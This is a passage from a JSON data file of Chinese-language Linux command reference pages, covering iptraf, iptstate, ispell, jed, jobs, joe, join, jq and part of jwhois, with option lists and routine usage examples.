class=\"hljs-params\">--syn</span> <span class=\"hljs-params\">--dport</span> 80 -m connlimit <span class=\"hljs-params\">--connlimit-above</span> 100 -j REJECT <span class=\"hljs-comment\"># 限制并发连接访问数</span>\niptables -I INPUT -m limit <span class=\"hljs-params\">--limit</span> 3/hour <span class=\"hljs-params\">--limit-burst</span> 10 -j ACCEPT <span class=\"hljs-comment\"># limit模块; --limit-burst 默认为5</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "iptraf",
        "des": "实时地监视网卡流量",
        "body": "<h1 id=\"iptraf\">iptraf</h1>\n<p>实时地监视网卡流量</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>iptraf命令</strong> 可以实时地监视网卡流量，可以生成网络协议数据包信息、以太网信息、网络节点状态和ip校验和错误等信息。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">iptraf</span><span class=\"hljs-params\">(选项)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-i网络接口：立即在指定网络接口上开启IP流量监视；</span>\n<span class=\"hljs-deletion\">-g：立即开始生成网络接口的概要状态信息；</span>\n<span class=\"hljs-deletion\">-d网络接口：在指定网络接口上立即开始监视明细的网络流量信息；</span>\n<span class=\"hljs-deletion\">-s网络接口：在指定网络接口上立即开始监视TCP和UDP网络流量信息；</span>\n<span class=\"hljs-deletion\">-z网络接口：在指定网络接口上显示包计数；</span>\n<span class=\"hljs-deletion\">-l网络接口：在指定网络接口上立即开始监视局域网工作站信息；</span>\n<span class=\"hljs-deletion\">-t时间：指定iptraf指令监视的时间；</span>\n<span class=\"hljs-deletion\">-B；将标注输出重新定向到“/dev/null”，关闭标注输入，将程序作为后台进程运行；</span>\n<span class=\"hljs-deletion\">-f：清空所有计数器；</span>\n<span class=\"hljs-deletion\">-h：显示帮助信息。</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "iptstate",
        "des": "显示iptables的工作状态",
        "body": "<h1 id=\"iptstate\">iptstate</h1>\n<p>显示iptables的工作状态</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>iptstate命令</strong> 以top指令类似的风格时显示Linux内核中iptables的工作状态。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">iptstate</span><span class=\"hljs-params\">(选项)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-b：指定输出信息的排序规则；</span>\n<span class=\"hljs-deletion\">-d：不动态地改变窗口大小；</span>\n<span class=\"hljs-deletion\">-f：过滤本地回送信息；</span>\n<span class=\"hljs-deletion\">-l：将ip地址解析为域名；</span>\n<span class=\"hljs-deletion\">-L：隐藏于DNS查询相关状态；</span>\n<span class=\"hljs-deletion\">-r：指定刷新屏幕的频率；</span>\n<span class=\"hljs-deletion\">-R：反序排列；</span>\n<span class=\"hljs-deletion\">-s：单次运行模式；</span>\n<span class=\"hljs-deletion\">-t：显示汇总信息。</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "ispell",
        "des": "检查文件中出现的拼写错误",
        "body": "<h1 id=\"ispell\">ispell</h1>\n<p>检查文件中出现的拼写错误</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>ispell命令</strong> 用于检查文件中出现的拼写错误。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">ispell</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>文件：指定要进行拼写检查的文件。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "jed",
        "des": "主要用于编辑代码的编辑器",
        "body": "<h1 id=\"jed\">jed</h1>\n<p>主要用于编辑代码的编辑器</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>jed命令</strong> 是由Slang所开发，其主要用用途是编辑程序的源代码。它支持彩色语法加亮显示，可以模拟emacs，EDT，wordstar和Brief编辑器。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">jed</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-2：显示上下两个编辑区；</span>\n<span class=\"hljs-deletion\">-batch：以批处理模式来执行；</span>\n<span class=\"hljs-deletion\">-f&lt;函数&gt;：执行Slang函数；</span>\n<span class=\"hljs-deletion\">-g&lt;行数&gt;：移到缓冲区中指定的行数；</span>\n<span class=\"hljs-deletion\">-i&lt;文件&gt;：将指定的文件载入缓冲区；</span>\n<span class=\"hljs-deletion\">-n：不要载入jed.rc配置文件；</span>\n<span class=\"hljs-deletion\">-s&lt;字符串&gt;：查找并移到指定的字符串。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>文件：指定待编辑的文件列表。</p>\n<h3 id=\"实例\">实例</h3>\n<p>以上下两个编辑区的方式，开启 mysource.c 原始代码文件。若要切换编辑区，可利用稍后介绍的命令，开启操作命令，开启功能表后，按 3 ，再按 2 ，即可切换编辑区：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">jed</span> -<span class=\"hljs-number\">2</span> mysource.c\n</code></pre>\n<p> <strong>操作</strong> </p>\n<p>有些Emacs的组合键和jed菜单组合键冲突例如Alt+f在Emacs中应该是“前进一个单词”，而在jed中则是“文件菜单” 想使用Emacs风格的组合键的话，编辑<code>/usr/share/jed/lib/menus.slc</code>找到如下段落：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-title function_\">unsetsetkey</span> (<span class=\"hljs-string\">\"selectmenubar\"</span>, <span class=\"hljs-string\">\"<span class=\"hljs-char escape_\">\\e</span>m\"</span>);\n<span class=\"hljs-title function_\">unsetsetkey</span> (<span class=\"hljs-string\">\"@<span class=\"hljs-char escape_\">\\e</span>mF\"</span>, <span class=\"hljs-string\">\"<span class=\"hljs-char escape_\">\\e</span>f\"</span>);\n<span class=\"hljs-title function_\">unsetsetkey</span> (<span class=\"hljs-string\">\"@<span class=\"hljs-char escape_\">\\e</span>mE\"</span>, <span class=\"hljs-string\">\"<span class=\"hljs-char escape_\">\\e</span>e\"</span>);\n<span class=\"hljs-title function_\">unsetsetkey</span> (<span class=\"hljs-string\">\"@<span class=\"hljs-char escape_\">\\e</span>mo\"</span>, <span class=\"hljs-string\">\"<span class=\"hljs-char escape_\">\\e</span>o\"</span>);\n<span class=\"hljs-operator\">%</span> <span class=\"hljs-title class_\">Mode</span> <span class=\"hljs-variable\">menu</span> <span class=\"hljs-title function_\">unsetsetkey</span> (<span class=\"hljs-string\">\"@<span class=\"hljs-char escape_\">\\e</span>mS\"</span>, <span class=\"hljs-string\">\"<span class=\"hljs-char escape_\">\\e</span>s\"</span>);\n<span class=\"hljs-title function_\">unsetsetkey</span> (<span class=\"hljs-string\">\"@<span class=\"hljs-char escape_\">\\e</span>mB\"</span>, <span class=\"hljs-string\">\"<span class=\"hljs-char escape_\">\\e</span>b\"</span>);\n<span class=\"hljs-title function_\">unsetsetkey</span> (<span class=\"hljs-string\">\"@<span class=\"hljs-char escape_\">\\e</span>mi\"</span>, <span class=\"hljs-string\">\"<span class=\"hljs-char escape_\">\\e</span>i\"</span>);\n<span class=\"hljs-title function_\">unsetsetkey</span> (<span class=\"hljs-string\">\"@<span class=\"hljs-char escape_\">\\e</span>mH\"</span>, <span class=\"hljs-string\">\"<span class=\"hljs-char escape_\">\\e</span>h\"</span>);\n<span class=\"hljs-title function_\">unset_setkey</span> (<span class=\"hljs-string\">\"@<span class=\"hljs-char escape_\">\\e</span>my\"</span>, <span class=\"hljs-string\">\"<span class=\"hljs-char escape_\">\\e</span>y\"</span>);\n</code></pre>\n<p>可以根据自己的需要修改，也可以简单的注释掉；使用菜单可以用F10键。</p>\n<p>由于Jed可模拟多种编辑器，其各自按键指令也有所不同。这里以模拟 Emacs 为例，说明在编辑器中的操作方法。</p>\n<p> <strong>文件</strong> </p>\n<pre><code class=\"language-shell\"><span class=\"hljs-regexp\">/usr/</span>share<span class=\"hljs-regexp\">/jed/</span>lib/*.sl 这是默认的运行jed slang的文件。\n<span class=\"hljs-regexp\">/usr/</span>share<span class=\"hljs-regexp\">/jed/</span>lib/site.sl 这是默认的启动文件。\n<span class=\"hljs-regexp\">/etc/</span>jed.rc 这是全局系统配置文件。\n~/.jedrc 这是用户配置文件。\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "jobs",
        "des": "显示作业的状态。",
        "body": "<h1 id=\"jobs\">jobs</h1>\n<p>显示作业的状态。</p>\n<h2 id=\"概要\">概要</h2>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">jobs</span> [-lnprs] [jobspec ...]\n<span class=\"hljs-built_in\">jobs</span> -x <span class=\"hljs-built_in\">command</span> [args]\n</code></pre>\n<h2 id=\"主要用途\">主要用途</h2>\n<ul>\n<li>显示作业的状态。</li>\n<li>列出活动的作业。</li>\n<li>列出停止的作业。</li>\n</ul>\n<h2 id=\"选项\">选项</h2>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-l    在作业信息中额外的列出PID。</span>\n<span class=\"hljs-deletion\">-n    只列出最近一次通知以来状态变更的作业。</span>\n<span class=\"hljs-deletion\">-p    只列出PID。</span>\n<span class=\"hljs-deletion\">-r    只输出处于运行状态的作业。</span>\n<span class=\"hljs-deletion\">-s    只输出处于停止状态的作业。</span>\n</code></pre>\n<h2 id=\"返回值\">返回值</h2>\n<p>返回状态为成功除非给出了非法选项、执行出现错误。</p>\n<p>如果使用<code>jobs -x command [args]</code>形式执行，那么返回值为<code>command</code>的退出状态。</p>\n<h2 id=\"例子\">例子</h2>\n<pre><code class=\"language-shell\">[<span class=\"hljs-meta\">user2@pc</span>] ssh <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.1</span><span class=\"hljs-number\">.4</span>\npc@<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.1</span><span class=\"hljs-number\">.4'</span>s password:\n<span class=\"hljs-meta\"># 此时按下ctrl+z使得交互停止。</span>\n[<span class=\"hljs-meta\">1</span>]+  Stopped                 ssh <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.1</span><span class=\"hljs-number\">.4</span>\n\n[<span class=\"hljs-meta\">user2@pc</span>] sleep <span class=\"hljs-number\">60</span> &amp;\n[<span class=\"hljs-meta\">2</span>] <span class=\"hljs-number\">13338</span>\n\n[<span class=\"hljs-meta\">user2@pc</span>] jobs\n[<span class=\"hljs-meta\">1</span>]-  Stopped                 ssh <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.1</span><span class=\"hljs-number\">.4</span>\n[<span class=\"hljs-meta\">2</span>]   Running                 sleep <span class=\"hljs-number\">60</span> &amp;\n\n[<span class=\"hljs-meta\">user2@pc</span>] jobs -l\n[<span class=\"hljs-meta\">1</span>]- <span class=\"hljs-number\">12927</span> Stopped                 ssh <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.1</span><span class=\"hljs-number\">.4</span>\n[<span class=\"hljs-meta\">2</span>]  <span class=\"hljs-number\">13338</span> Running                 sleep <span class=\"hljs-number\">60</span> &amp;\n\n[<span class=\"hljs-meta\">user2@pc</span>] jobs -p\n<span class=\"hljs-number\">12927</span>\n<span class=\"hljs-number\">13338</span>\n\n[<span class=\"hljs-meta\">user2@pc</span>] jobs -s\n[<span class=\"hljs-meta\">1</span>]-  Stopped                 ssh <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.1</span><span class=\"hljs-number\">.4</span>\n\n[<span class=\"hljs-meta\">user2@pc</span>] jobs -r\n[<span class=\"hljs-meta\">2</span>]   Running                 sleep <span class=\"hljs-number\">60</span> &amp;\n\n[<span class=\"hljs-meta\">user2@pc</span>] kill <span class=\"hljs-number\">-9</span> <span class=\"hljs-number\">12927</span>\n[<span class=\"hljs-meta\">2</span>]   Done                    sleep <span class=\"hljs-number\">60</span>\n\n[<span class=\"hljs-meta\">user2@pc</span>] jobs -n -l\n[<span class=\"hljs-meta\">1</span>]+ <span class=\"hljs-number\">12927</span> Killed             ssh <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.1</span><span class=\"hljs-number\">.4</span>\n\n[<span class=\"hljs-meta\">user2@pc</span>] jobs -n -l\n</code></pre>\n<h3 id=\"注意\">注意</h3>\n<ol>\n<li><code>bash</code>的作业控制命令包括<code>bg fg kill wait disown suspend</code>。</li>\n<li>该命令需要<code>set</code>选项<code>monitor</code>处于开启状态时才能执行；查看作业控制状态：输入<code>set -o</code>查看<code>monitor</code>行；执行<code>set -o monitor</code>或<code>set -m</code>开启该选项。</li>\n<li>该命令是bash内建命令，相关的帮助信息请查看<code>help</code>命令。</li>\n</ol>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "joe",
        "des": "强大的纯文本编辑器",
        "body": "<h1 id=\"joe\">joe</h1>\n<p>强大的纯文本编辑器</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>joe命令</strong> 是一款功能强大的纯文本编辑器，拥有众多编写程序和文本的优良特性。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">joe</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-force：强制在最后一行的结尾处加上换行符号；</span>\n<span class=\"hljs-deletion\">-lines&lt;行数&gt;：设置行数；</span>\n<span class=\"hljs-deletion\">-lightoff：选取的区块在执行完区块命令后，就会恢复成原来的状态；</span>\n<span class=\"hljs-deletion\">-autoindent：自动缩排；</span>\n<span class=\"hljs-deletion\">-backpath：&lt;目录&gt;：指定备份文件的目录；</span>\n<span class=\"hljs-deletion\">-beep：编辑时，若有错误即发出哔声；</span>\n<span class=\"hljs-deletion\">-columns&lt;栏位&gt;：设置栏数；</span>\n<span class=\"hljs-deletion\">-csmode：可执行连续查找模式；</span>\n<span class=\"hljs-deletion\">-dopadding：是程序跟tty间存在缓冲区；</span>\n<span class=\"hljs-deletion\">-exask：在程序中，执行“Ctrl+k+x”时，会先确认是否要保存文件；</span>\n<span class=\"hljs-deletion\">-force：强制在最后一行的结尾处加上换行符号；</span>\n<span class=\"hljs-deletion\">-help：执行程序时一并显示帮助；</span>\n<span class=\"hljs-deletion\">-keepup：在进入程序后，画面上方为状态列；</span>\n<span class=\"hljs-deletion\">-marking：在选取区块时，反白区块会随着光标移动；</span>\n<span class=\"hljs-deletion\">-mid：当光标移出画面时，即自动卷页，使光标回到中央；</span>\n<span class=\"hljs-deletion\">-nobackups：不建立备份文件；</span>\n<span class=\"hljs-deletion\">-nonotice：程序执行时，不显示版本信息；</span>\n<span class=\"hljs-deletion\">-nosta：程序执行时，不显示状态列；</span>\n<span class=\"hljs-deletion\">-noxon：尝试取消“Ctrl+s”和“Ctrl+q”键的功能；</span>\n<span class=\"hljs-deletion\">-orphan：若同时开启一个以上的文件，则其他文件会置于独立的缓冲区，而不会另外开启编辑区；</span>\n<span class=\"hljs-deletion\">-pg&lt;行数&gt;：按“PageUp”或“PageDown”换页时，所要保留前一页的行数；</span>\n<span class=\"hljs-deletion\">-skiptop&lt;行数&gt;：不使用屏幕上方指定的行数。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>文件：指定要编辑的文件。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "join",
        "des": "两个文件中指定栏位内容相同的行连接起来",
        "body": "<h1 id=\"join\">join</h1>\n<p>两个文件中指定栏位内容相同的行连接起来</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>join命令</strong> 用来将两个文件中，制定栏位内容相同的行连接起来。找出两个文件中，指定栏位内容相同的行，并加以合并，再输出到标准输出设备。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">join</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-a&lt;1或2&gt;：除了显示原来的输出内容之外，还显示指令文件中没有相同栏位的行；</span>\n<span class=\"hljs-deletion\">-e&lt;字符串&gt;：若[文件1]与[文件2]中找不到指定的栏位，则在输出中填入选项中的字符串；</span>\n<span class=\"hljs-deletion\">-i或--ignore-case：比较栏位内容时，忽略大小写的差异；</span>\n<span class=\"hljs-deletion\">-o&lt;格式&gt;：按照指定的格式来显示结果；</span>\n<span class=\"hljs-deletion\">-t&lt;字符&gt;：使用栏位的分割字符；</span>\n<span class=\"hljs-deletion\">-v&lt;1或2&gt;：更-a相同，但是只显示文件中没有相同栏位的行；</span>\n<span class=\"hljs-deletion\">-1&lt;栏位&gt;：连接[文件1]指定的栏位；</span>\n<span class=\"hljs-deletion\">-2&lt;栏位&gt;：连接[文件2]指定的栏位。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<ul>\n<li>  文件1：要进行合并操作的第1个文件参数；</li>\n<li>  文件2：要进行合并操作的第2个文件参数。</li>\n</ul>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "jq",
        "des": "一个灵活的轻量级命令行JSON处理器",
        "body": "<h1 id=\"jq\">jq</h1>\n<p>一个灵活的轻量级命令行JSON处理器</p>\n<h3 id=\"补充说明\">补充说明</h3>\n<p>jq 是 stedolan 开发的一个轻量级的和灵活的命令行JSON处理器，源码请参考 <a href=\"https://github.com/stedolan/jq\">jq 项目主页</a></p>\n<p>jq 用于处理JSON输入，将给定过滤器应用于其JSON文本输入并在标准输出上将过滤器的结果生成为JSON。</p>\n<p>最简单的过滤器是<code>.</code>，它将jq的输入未经修改地复制到其输出中（格式设置除外）。</p>\n<p>请注意，jq 当前仅支持64位双精度浮点数（IEEE754）。</p>\n<h3 id=\"安装\">安装</h3>\n<pre><code class=\"language-bash\"><span class=\"hljs-comment\"># Debian系，如 Ubuntu</span>\nsudo apt-get <span class=\"hljs-keyword\">install </span><span class=\"hljs-keyword\">jq\n</span>\n<span class=\"hljs-comment\"># RedHat系, 如 CentOS</span>\nyum <span class=\"hljs-keyword\">install </span><span class=\"hljs-keyword\">jq</span>\n</code></pre>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-bash\">j<span class=\"hljs-string\">q [options]</span> &lt;jq filter&gt; [file...]\nj<span class=\"hljs-string\">q [options]</span> --args &lt;jq filter&gt; [strings...]\nj<span class=\"hljs-string\">q [options]</span> --jsonargs &lt;jq filter&gt; [JSON_TEXTS...]\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-bash\"><span class=\"hljs-deletion\">-c               紧凑而不是漂亮的输出;</span>\n<span class=\"hljs-deletion\">-n               使用`null`作为单个输入值;</span>\n<span class=\"hljs-deletion\">-e               根据输出设置退出状态代码;</span>\n<span class=\"hljs-deletion\">-s               将所有输入读取（吸取）到数组中；应用过滤器;</span>\n<span class=\"hljs-deletion\">-r               输出原始字符串，而不是JSON文本;</span>\n<span class=\"hljs-deletion\">-R               读取原始字符串，而不是JSON文本;</span>\n<span class=\"hljs-deletion\">-C               为JSON着色;</span>\n<span class=\"hljs-deletion\">-M               单色（不要为JSON着色）;</span>\n<span class=\"hljs-deletion\">-S               在输出上排序对象的键;</span>\n<span class=\"hljs-deletion\">--tab            使用制表符进行缩进;</span>\n<span class=\"hljs-deletion\">--arg a v        将变量$a设置为value&lt;v&gt;;</span>\n<span class=\"hljs-deletion\">--argjson a v    将变量$a设置为JSON value&lt;v&gt;;</span>\n<span class=\"hljs-deletion\">--slurpfile a f  将变量$a设置为从&lt;f&gt;读取的JSON文本数组;</span>\n<span class=\"hljs-deletion\">--rawfile a f    将变量$a设置为包含&lt;f&gt;内容的字符串;</span>\n<span class=\"hljs-deletion\">--args           其余参数是字符串参数，而不是文件;</span>\n<span class=\"hljs-deletion\">--jsonargs       其余的参数是JSON参数，而不是文件;</span>\n<span class=\"hljs-deletion\">--               终止参数处理;</span>\n</code></pre>\n<h3 id=\"例子\">例子</h3>\n<p><code>.</code>: 以漂亮的方式输出</p>\n<pre><code class=\"language-bash\">$ echo <span class=\"hljs-string\">'{ \"</span>foo<span class=\"hljs-string\">\": { \"</span>bar<span class=\"hljs-string\">\": { \"</span>baz<span class=\"hljs-string\">\": 123 } } }'</span> | jq <span class=\"hljs-string\">'.'</span>\n{\n  <span class=\"hljs-string\">\"foo\"</span>: {\n    <span class=\"hljs-string\">\"bar\"</span>: {\n      <span class=\"hljs-string\">\"baz\"</span>: <span class=\"hljs-number\">123</span>\n    }\n  }\n}\n</code></pre>\n<p><code>.foo, .foo.bar, .foo?</code>: 获取一个键的值</p>\n<pre><code class=\"language-bash\">$ <span class=\"hljs-keyword\">echo</span> '{<span class=\"hljs-string\">\"foo\"</span>: 42, <span class=\"hljs-string\">\"bar\"</span>: <span class=\"hljs-string\">\"less interesting data\"</span>}' | jq '<span class=\"hljs-string\">.foo</span>'\n42\n</code></pre>\n<p><code>.[], .[]?, .[2], .[10:15]</code>: 数组运算</p>\n<pre><code class=\"language-bash\">$ <span class=\"hljs-built_in\">echo</span> '[{<span class=\"hljs-string\">\"name\"</span>:<span class=\"hljs-string\">\"JSON\"</span>, <span class=\"hljs-string\">\"good\"</span>:<span class=\"hljs-literal\">true</span>}, {<span class=\"hljs-string\">\"name\"</span>:<span class=\"hljs-string\">\"XML\"</span>, <span class=\"hljs-string\">\"good\"</span>:<span class=\"hljs-literal\">false</span>}]' | jq '.[<span class=\"hljs-number\">1</span>]'\n{\n  <span class=\"hljs-string\">\"name\"</span>: <span class=\"hljs-string\">\"XML\"</span>,\n  <span class=\"hljs-string\">\"good\"</span>: <span class=\"hljs-literal\">false</span>\n}\n</code></pre>\n<p><code>[], {}</code>: 构造一个数组/对象</p>\n<pre><code class=\"language-bash\">$ <span class=\"hljs-keyword\">echo</span> '{<span class=\"hljs-string\">\"user\"</span>:<span class=\"hljs-string\">\"stedolan\"</span>,<span class=\"hljs-string\">\"titles\"</span>:[<span class=\"hljs-string\">\"JQ Primer\"</span>, <span class=\"hljs-string\">\"More JQ\"</span>]}' | jq '{user, title: <span class=\"hljs-string\">.titles</span>[]}'\n\n{\n  <span class=\"hljs-string\">\"user\"</span>: <span class=\"hljs-string\">\"stedolan\"</span>,\n  <span class=\"hljs-string\">\"title\"</span>: <span class=\"hljs-string\">\"JQ Primer\"</span>\n}\n{\n  <span class=\"hljs-string\">\"user\"</span>: <span class=\"hljs-string\">\"stedolan\"</span>,\n  <span class=\"hljs-string\">\"title\"</span>: <span class=\"hljs-string\">\"More JQ\"</span>\n}\n</code></pre>\n<p><code>length</code>: 计算一个值的长度</p>\n<pre><code class=\"language-bash\">$ echo '[[<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">2</span>], <span class=\"hljs-string\">\"string\"</span>, {<span class=\"hljs-string\">\"a\"</span>:<span class=\"hljs-number\">2</span>}, null]' | <span class=\"hljs-type\">jq</span> '.[] | <span class=\"hljs-type\">length</span>'                                  \n<span class=\"hljs-number\">2</span>\n<span class=\"hljs-number\">6</span>\n<span class=\"hljs-number\">1</span>\n<span class=\"hljs-number\">0</span>\n</code></pre>\n<p><code>keys</code>: 取出数组中的键</p>\n<pre><code class=\"language-bash\">$ echo <span class=\"hljs-string\">'{\"</span>abc<span class=\"hljs-string\">\": 1, \"</span>abcd<span class=\"hljs-string\">\": 2, \"</span>Foo<span class=\"hljs-string\">\": 3}'</span> | jq <span class=\"hljs-string\">'keys'</span>                                        \n[\n  <span class=\"hljs-string\">\"Foo\"</span>,\n  <span class=\"hljs-string\">\"abc\"</span>,\n  <span class=\"hljs-string\">\"abcd\"</span>\n]\n</code></pre>\n<p><code>,</code>: 使用多个过滤器</p>\n<pre><code class=\"language-bash\">$ <span class=\"hljs-keyword\">echo</span> '{ <span class=\"hljs-string\">\"foo\"</span>: 42, <span class=\"hljs-string\">\"bar\"</span>: <span class=\"hljs-string\">\"something else\"</span>, <span class=\"hljs-string\">\"baz\"</span>: <span class=\"hljs-literal\">true</span>}' | jq '<span class=\"hljs-string\">.foo</span>, <span class=\"hljs-string\">.bar</span>' \n42\n<span class=\"hljs-string\">\"something else\"</span>\n</code></pre>\n<p><code>|</code>: 通过管道将一个过滤器的输出当做下一个过滤器的输入</p>\n<pre><code class=\"language-bash\">$ echo '[{<span class=\"hljs-string\">\"name\"</span>:<span class=\"hljs-string\">\"JSON\"</span>, <span class=\"hljs-string\">\"good\"</span>:<span class=\"hljs-literal\">true</span>}, {<span class=\"hljs-string\">\"name\"</span>:<span class=\"hljs-string\">\"XML\"</span>, <span class=\"hljs-string\">\"good\"</span>:<span class=\"hljs-literal\">false</span>}]' | jq '.[] | .<span class=\"hljs-built_in\">name</span>'                                                 \n<span class=\"hljs-string\">\"JSON\"</span>\n<span class=\"hljs-string\">\"XML\"</span>\n</code></pre>\n<p><code>select(foo)</code>: 如果foo返回true，则输入保持不变</p>\n<pre><code class=\"language-bash\"><span class=\"hljs-meta\">$ </span><span class=\"language-bash\"><span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">'[1,5,3,0,7]'</span> | jq <span class=\"hljs-string\">'map(select(. &gt;= 2))'</span></span>                                                    \n[\n  5,\n  3,\n  7\n]\n</code></pre>\n<p><code>map(foo)</code>: 每个输入调用过滤器</p>\n<pre><code class=\"language-bash\"><span class=\"hljs-meta\">$ </span><span class=\"language-bash\"><span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">'[1,2,3]'</span> | jq <span class=\"hljs-string\">'map(.+1)'</span></span>\n[\n  2,\n  3,\n  4\n]\n</code></pre>\n<p><code>if-then-else-end</code>: 条件判断</p>\n<pre><code class=\"language-bash\"> $ echo <span class=\"hljs-string\">'2'</span> | jq <span class=\"hljs-symbol\">'if</span> . == <span class=\"hljs-number\">0</span> <span class=\"hljs-keyword\">then</span> <span class=\"hljs-string\">\"zero\"</span> elif . == <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">then</span> <span class=\"hljs-string\">\"one\"</span> <span class=\"hljs-keyword\">else</span> <span class=\"hljs-string\">\"many\"</span> <span class=\"hljs-keyword\">end</span>'\n\n<span class=\"hljs-string\">\"many\"</span>\n</code></pre>\n<p><code>\\(foo)</code>: 在字符串中插入值并进行运算</p>\n<pre><code class=\"language-bash\"><span class=\"hljs-string\">$ </span>echo <span class=\"hljs-string\">'42'</span> | jq <span class=\"hljs-string\">'\"The input was \\(.), which is one less than \\(.+1)\"'</span>          \n\n<span class=\"hljs-comment\">\"The input was 42, which is one less than 43\"</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "jwhois",
        "des": "whois 客户端服务",
        "body": "<h1 id=\"jwhois\">jwhois</h1>\n<p>whois 客户端服务</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>jwhois</strong>  searches Whois servers for the object on the command line.The host to query is taken from a global configuration file, a configuration file specified on the command line, or selected directly on the command line.</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">jwhois</span><span class=\"hljs-meta\"> [选项]</span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\">--<span class=\"hljs-keyword\">version</span>                  <span class=\"hljs-keyword\">display</span> <span class=\"hljs-keyword\">version</span> number and patch level\n--<span class=\"hljs-keyword\">help</span>                     <span class=\"hljs-keyword\">display</span> this <span class=\"hljs-keyword\">help</span>\n-v, --verbose              verbose debug output\n-c <span class=\"hljs-keyword\">FILE</span>, --config=<span class=\"hljs-keyword\">FILE</span>     <span class=\"hljs-keyword\">use</span> <span class=\"hljs-keyword\">FILE</span> <span class=\"hljs-keyword\">as</span> configuration <span class=\"hljs-keyword\">file</span>\n-<span class=\"hljs-keyword\">h</span> HOST, --host=HOST       explicitly <span class=\"hljs-keyword\">query</span> HOST\n-<span class=\"hljs-keyword\">n</span>, --<span class=\"hljs-keyword\">no</span>-redirect          disable content redirection\n-s, --<span class=\"hljs-keyword\">no</span>-whoisservers      disable whois-servers.<span class=\"hljs-keyword\">net</span> service support\n-a, --raw                  disable reformatting of the <span class=\"hljs-keyword\">query</span>\n-i, --<span class=\"hljs-keyword\">display</span>-redirections <span class=\"hljs-keyword\">display</span> all redirects instead of hiding them\n-p PORT, --port=PORT       <span class=\"hljs-keyword\">use</span> port number PORT (<span class=\"hljs-keyword\">in</span> conjunction with HOST)\n-r, --rwhois               force <span class=\"hljs-keyword\">an</span> rwhois <span class=\"hljs-keyword\">query</span> to be made\n--rwhois-<span class=\"hljs-keyword\">display</span>=<span class=\"hljs-keyword\">DISPLAY</span>   sets the <span class=\"hljs-keyword\">display</span> option <span class=\"hljs-keyword\">in</span> rwhois queries\n--rwhois-limit=LIMIT       sets the maximum number of matches to <span 